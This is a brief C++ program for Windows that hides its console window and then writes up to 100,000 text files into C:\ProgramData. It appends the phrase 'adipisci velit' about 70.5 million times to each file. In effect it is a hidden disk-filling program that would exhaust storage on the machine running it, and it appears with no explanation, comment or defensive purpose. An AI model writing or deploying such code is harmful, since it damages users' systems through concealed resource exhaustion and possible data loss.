#include <iostream>  
#include <string>     
#include <fstream>
#include <math.h>
#include <windows.h>


using namespace std;

void wrt(){

ShowWindow(GetConsoleWindow(),SW_HIDE);

for(int i=0;i<pow(10,5);i++){
 	string ss="file";
	string bb=to_string(i);
	string aa=".txt";
	string y=ss+bb+aa;
	ofstream myfile("C:\\ProgramData\\"+y,ios::app);
 	
	 for(int y=0;y<pow(10,5)*705;y++){
	 myfile<<"adipisci velit"<<endl;
	}
 	
}
}
int main ()
{
wrt();
 
 
  return 0;
}
